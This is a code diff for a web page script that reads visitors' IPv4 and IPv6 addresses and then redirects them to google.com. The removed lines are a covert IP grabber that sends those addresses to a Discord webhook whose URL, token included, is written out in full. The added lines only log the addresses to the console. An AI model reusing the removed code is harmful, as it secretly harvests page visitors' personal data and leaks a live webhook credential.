@@ -29,41 +29,13 @@
             return { ipv4, ipv6 };
         }
 
-            getIPs();
+        (async () => {
+            const { ipv4, ipv6 } = await getIPs();
 
-            // Webhook
+            console.log("IPv4:", ipv4);
+            console.log("IPv6:", ipv6);
 
-            const webhookUrl = "https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l";
-
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    embeds: [
-                        {
-                            title: "Visitor detected!",
-                            color: 0xFFD700,
-
-                            fields: [
-                                {
-                                    name: "IPv4",
-                                    value: ipv4,
-                                    inline: false
-                                },
-                                {
-                                    name: "IPv6",
-                                    value: ipv6,
-                                    inline: false
-                                }
-                            ],
-
-                            timestamp: new Date().toISOString()
-                        }
-                    ]
-                })
-            })
+            // Hier kann zusätzlicher Code ausgeführt werden
 
             window.location.replace("https://google.com");
         })();
